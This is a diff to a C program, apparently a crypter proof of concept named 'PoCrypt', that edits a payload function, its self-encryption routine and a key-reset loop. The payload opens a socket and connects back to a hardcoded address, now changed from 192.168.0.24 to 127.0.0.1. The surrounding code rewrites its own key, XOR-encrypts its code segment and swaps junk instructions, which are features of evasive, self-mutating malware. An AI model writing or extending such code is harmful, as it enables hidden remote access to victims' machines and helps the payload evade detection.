@@ -6,7 +6,7 @@
 */
 
 #include "PoCrypt.h"
-#include "tmp_header.h"
+#include "meta.h"
 
 static int get_file_size (int fd)
 {
@@ -72,7 +72,7 @@ CRYPTED(CODE) void payload(void)
     sockt = socket(AF_INET, SOCK_STREAM,0);
     revsockaddr.sin_family = AF_INET;
     revsockaddr.sin_port = htons(port);
-    revsockaddr.sin_addr.s_addr = inet_addr("192.168.0.24");
+    revsockaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
 
     connect(sockt, (struct sockaddr *) &revsockaddr,
     sizeof(revsockaddr));
@@ -123,13 +123,14 @@ static void decode_and_crypt(crypter_t *crypter)
 
     /* Give W permission on .PoC_key && rewrite key in binary && Remove W perm on .PoC_key*/
     change_section_permissions(key_offset, crypter->seg_len, true);
-    generate_key(crypter->bin_content + key_offset, crypter->seg_len);
-    change_section_permissions(  key_offset, crypter->seg_len, false);
+    generate_key(crypter->bin_content + key_offset, crypter->seg_len); // New key
+    change_section_permissions(key_offset, crypter->seg_len, false);
 
-    // ! C'est ici que c'est décrypté , donc on change les instructions ici
-    replace_junk(&(crypter->bin_content), NULL, crypter->bin_len);
+    // ! The data's clear here, so we can look for the pattern and change it's instructions
+    unsigned char **ptr_bin = (unsigned char **)&(crypter->bin_content);
+    replace_junk(ptr_bin, NULL, crypter->bin_len);
 
-    /* Overwrite */
+    /* Xor with the new key and overwrite */
     xor_segment(crypter->bin_content + crypter->seg_offset, crypter->seg_len);
     save(crypter);
 }
@@ -145,7 +146,7 @@ void remove_first_time(crypter_t *crypter)
         write(1, "Big problem in your program man\n", 32);
         return;
     }
-    for (int i = 0; i < 4; i++)
+    for (int i = 0; i < 2; i++)
         boolean_pos[i] = 0;
     for (int i = 0 ; i < CRYPTED_FUNC_SIZE; i++)
         key[i] = 1;
